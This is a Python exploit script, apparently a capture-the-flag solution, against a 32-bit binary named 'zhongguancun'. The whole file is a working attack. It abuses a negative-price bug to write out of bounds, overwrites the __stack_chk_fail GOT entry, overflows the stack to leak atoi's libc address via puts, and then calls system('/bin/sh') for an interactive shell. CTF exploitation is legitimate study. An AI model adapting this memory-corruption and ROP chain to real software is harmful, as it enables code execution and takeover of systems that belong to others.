# -*- coding:utf-8 -*-
from zio import *
target='./zhongguancun'
addr_blackberry=0x0804b0fc
rop_retn=0x080486aa
got_stack_fail=0x0804b048
payload=l32(rop_retn)*3
addr_puts=0x080489c3
addr_store_cmd=0x08049147
got_atoi=0x0804b038
offset_atoi=0x2d560
offset_system=0x3b6b0
offset_bin=0x12a474
def add_item(io,item_name,decription):
    io.read_until('? ')
    io.writeline('a')
    io.read_until('? ')
    io.writeline('a')
    io.read_until('? ')
    io.writeline(item_name)
    io.read_until('? ')
    io.writeline('4')
    io.read_until('? ')
    io.writeline('-'+'1'*14)
    io.read_until('? ')
    io.writeline(decription)
    io.read_until('? ')
    io.writeline('d')
def create_store(io,store_name,item_name,decription):
    io.read_until('? ')
    io.writeline('a')
    io.read_until('? ')
    io.writeline(store_name)
    io.read_until('? ')
    io.writeline('a')
    io.read_until('? ')
    io.writeline(item_name)
    io.read_until('? ')
    io.writeline('4')
    io.read_until('? ')
    io.writeline('-'+'1'*14)
    io.read_until('? ')
    io.writeline(decription)
    io.read_until('? ')
    io.writeline('d')
def generate(io):
    io.read_until('? ')
    io.writeline('a')
    io.read_until('? ')
    io.writeline('c')
    io.read_until('? ')
    io.writeline('d')
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    store_name='name'*15+'xxx'
    item_name='a'*31
    description='b'*79
    create_store(io,store_name,item_name,description)
    length=len('Blackberry OS Phone Z price: -2147483648 CNY description: ')
    generate(io)
    for x in xrange(15):
        if x == 0:
            item_name=payload+'a'*(31-len(payload))
            description = payload+'Z'*(79-len(payload))
        if x == 14:
            description=payload+'Z'*(74-len(payload))+l32(0x08049b74)+'Z'
        add_item(io,item_name,description)
    generate(io)
    #改got表
    io.read_until('? ')
    io.writeline('b')
    io.read_until('? ')
    io.writeline('2')
    io.read_until('? ')
    io.writeline('b')
    io.read_until('? ')
    io.gdb_hint()
    io.writeline(str(addr_blackberry-length))
    io.read_until('? ')
    io.writeline('b')
    io.read_until("? ")
    io.writeline(str(got_stack_fail))
    #栈溢出
    io.read_until('? ')
    io.writeline('c')
    io.read_until('? ')
    io.writeline('a')
    payload2='d'*32+l32(addr_puts)+l32(addr_store_cmd)+l32(got_atoi)
    io.read_until('? ')
    io.writeline(payload2)
    io.read_until('Long.\n')
    data=io.read(4)
    print 'data:%s'%data
    io.read_until('? ')
    real_atoi=l32(data)
    print hex(real_atoi)
    #bin/sh
    real_system=real_atoi-offset_atoi+offset_system
    real_bin=real_atoi-offset_atoi+offset_bin
    payload3='d'*32+l32(real_system)+'1234'+l32(real_bin)
    io.writeline(payload3)
    io.read_until('Long.\n')
    io.interact()
exp(target)